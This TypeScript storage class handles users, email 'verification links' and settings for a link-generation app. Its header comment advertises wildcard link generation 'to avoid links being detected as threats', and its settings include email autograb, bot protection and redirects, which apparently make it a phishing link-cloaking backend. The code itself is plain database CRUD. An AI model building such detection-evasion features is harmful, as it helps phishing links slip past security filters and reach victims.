import { 
  users, 
  type User, 
  type InsertUser, 
  verificationLinks, 
  type VerificationLink, 
  type InsertVerificationLink,
  settings,
  type Setting,
  type InsertSetting
} from "@shared/schema";
import { db } from "./db";
import { eq, and, desc, sql } from "drizzle-orm";
import crypto from 'crypto';
import { generateSecureCode } from './encryption';
import { IStorage } from './storage';

/**
 * Enhanced DatabaseStorage implementation with advanced security features
 * - Implements advanced encryption with 5 security levels
 * - Supports wildcard generation to avoid links being detected as threats
 * - Handles duplicate email detection and re-generation
 */
export class SecureStorage implements IStorage {
  // User operations
  async getUser(id: number): Promise<User | undefined> {
    const [user] = await db.select().from(users).where(eq(users.id, id));
    return user || undefined;
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    const [user] = await db.select().from(users).where(eq(users.username, username));
    return user || undefined;
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const [user] = await db
      .insert(users)
      .values(insertUser)
      .returning();
    return user;
  }
  
  // Verification link operations
  async createVerificationLink(data: InsertVerificationLink): Promise<VerificationLink> {
    // First check for existing links for this email
    const existingLinks = await this.getVerificationLinksByEmail(data.email);
    
    const [link] = await db
      .insert(verificationLinks)
      .values({
        ...data,
        status: 'pending',
        createdAt: new Date(),
        verifiedAt: null
      })
      .returning();
    
    return {
      ...link,
      // Add a flag to indicate if this was a regeneration
      regenerated: existingLinks.length > 0
    } as VerificationLink;
  }
  
  async getVerificationLinkByCode(code: string): Promise<VerificationLink | undefined> {
    const [link] = await db
      .select()
      .from(verificationLinks)
      .where(eq(verificationLinks.code, code));
    return link || undefined;
  }
  
  async getVerificationLinksByEmail(email: string): Promise<VerificationLink[]> {
    return db
      .select()
      .from(verificationLinks)
      .where(eq(verificationLinks.email, email));
  }
  
  async getAllVerificationLinks(): Promise<VerificationLink[]> {
    return db
      .select()
      .from(verificationLinks)
      .orderBy(desc(verificationLinks.createdAt));
  }
  
  async updateVerificationLinkStatus(id: number, status: string, verifiedAt?: Date): Promise<VerificationLink | undefined> {
    const [link] = await db
      .update(verificationLinks)
      .set({ 
        status, 
        verifiedAt: verifiedAt || undefined 
      })
      .where(eq(verificationLinks.id, id))
      .returning();
    return link || undefined;
  }
  
  // Helper for cleaning up expired or old verification links
  async clearVerificationLinks(olderThanDays?: number): Promise<number> {
    if (olderThanDays) {
      const cutoffDate = new Date();
      cutoffDate.setDate(cutoffDate.getDate() - olderThanDays);
      
      const result = await db.delete(verificationLinks)
        .where(
          and(
            eq(verificationLinks.status, 'pending'),
            // Use SQL function to compare dates - convert the string dates to Date objects
            // This works with ISO format dates stored in the database
            sql`${verificationLinks.createdAt} < ${cutoffDate.toISOString()}`
          )
        )
        .returning({ id: verificationLinks.id });
        
      return result.length;
    } else {
      // Just delete all pending links if no date specified
      const result = await db.delete(verificationLinks)
        .where(eq(verificationLinks.status, 'pending'))
        .returning({ id: verificationLinks.id });
      
      return result.length;
    }
  }
  
  // Helper to get links grouped by creation date (session)
  async getVerificationLinksGroupedBySession(): Promise<{
    date: string;
    count: number;
    links: VerificationLink[];
  }[]> {
    const allLinks = await this.getAllVerificationLinks();
    
    // Group links by date (YYYY-MM-DD)
    const groupedLinks = new Map<string, VerificationLink[]>();
    
    allLinks.forEach(link => {
      const dateKey = new Date(link.createdAt).toISOString().split('T')[0];
      if (!groupedLinks.has(dateKey)) {
        groupedLinks.set(dateKey, []);
      }
      groupedLinks.get(dateKey)?.push(link);
    });
    
    // Convert map to array of objects
    const result = Array.from(groupedLinks.entries()).map(([date, links]) => ({
      date,
      count: links.length,
      links
    }));
    
    // Sort by date descending (newest first)
    return result.sort((a, b) => new Date(b.date).getTime() - new Date(a.date).getTime());
  }
  
  // Settings operations
  async getSettings(): Promise<Setting | undefined> {
    const [setting] = await db.select().from(settings);
    
    // If no settings exist, create default settings
    if (!setting) {
      return this.updateSettings({
        redirectUrl: "https://example.com/thank-you",
        showLoadingSpinner: true,
        loadingDuration: 3,
        successMessage: "Thank you for verifying your email address!",
        useEmailAutograb: false,
        emailAutograbParam: "email",
        enableBotProtection: true,
        customThankYouPage: "",
        useCustomThankYouPage: false,
        securityLevel: 1,
        useWildcards: false,
        encryptionSalt: "default-salt-change-me",
        additionalDomains: "[]"
      });
    }
    
    return setting;
  }
  
  async updateSettings(data: Partial<InsertSetting>): Promise<Setting> {
    // Check if settings exist
    const existingSettings = await db.select().from(settings);
    
    if (existingSettings.length === 0) {
      // Create new settings
      const [setting] = await db
        .insert(settings)
        .values({
          redirectUrl: data.redirectUrl || "https://example.com/thank-you",
          showLoadingSpinner: data.showLoadingSpinner !== undefined ? data.showLoadingSpinner : true,
          loadingDuration: data.loadingDuration || 3,
          successMessage: data.successMessage || "Thank you for verifying your email address!",
          useEmailAutograb: data.useEmailAutograb !== undefined ? data.useEmailAutograb : false,
          emailAutograbParam: data.emailAutograbParam || "email",
          enableBotProtection: data.enableBotProtection !== undefined ? data.enableBotProtection : true,
          customThankYouPage: data.customThankYouPage || "",
          useCustomThankYouPage: data.useCustomThankYouPage !== undefined ? data.useCustomThankYouPage : false,
          securityLevel: data.securityLevel !== undefined ? data.securityLevel : 1,
          useWildcards: data.useWildcards !== undefined ? data.useWildcards : false,
          encryptionSalt: data.encryptionSalt || "default-salt-change-me",
          additionalDomains: data.additionalDomains || "[]"
        })
        .returning();
      return setting;
    } else {
      // Update existing settings
      const [currentSetting] = existingSettings;
      const [updatedSetting] = await db
        .update(settings)
        .set({
          redirectUrl: data.redirectUrl !== undefined ? data.redirectUrl : currentSetting.redirectUrl,
          showLoadingSpinner: data.showLoadingSpinner !== undefined ? data.showLoadingSpinner : currentSetting.showLoadingSpinner,
          loadingDuration: data.loadingDuration !== undefined ? data.loadingDuration : currentSetting.loadingDuration,
          successMessage: data.successMessage !== undefined ? data.successMessage : currentSetting.successMessage,
          useEmailAutograb: data.useEmailAutograb !== undefined ? data.useEmailAutograb : currentSetting.useEmailAutograb,
          emailAutograbParam: data.emailAutograbParam !== undefined ? data.emailAutograbParam : currentSetting.emailAutograbParam,
          enableBotProtection: data.enableBotProtection !== undefined ? data.enableBotProtection : currentSetting.enableBotProtection,
          customThankYouPage: data.customThankYouPage !== undefined ? data.customThankYouPage : currentSetting.customThankYouPage,
          useCustomThankYouPage: data.useCustomThankYouPage !== undefined ? data.useCustomThankYouPage : currentSetting.useCustomThankYouPage,
          securityLevel: data.securityLevel !== undefined ? data.securityLevel : currentSetting.securityLevel,
          useWildcards: data.useWildcards !== undefined ? data.useWildcards : currentSetting.useWildcards,
          encryptionSalt: data.encryptionSalt !== undefined ? data.encryptionSalt : currentSetting.encryptionSalt,
          additionalDomains: data.additionalDomains !== undefined ? data.additionalDomains : currentSetting.additionalDomains
        })
        .where(eq(settings.id, currentSetting.id))
        .returning();
      return updatedSetting;
    }
  }
  
  // Helper method to generate verification codes with enhanced security
  async generateVerificationCode(): Promise<string> {
    const currentSettings = await this.getSettings();
    return generateSecureCode(currentSettings);
  }
}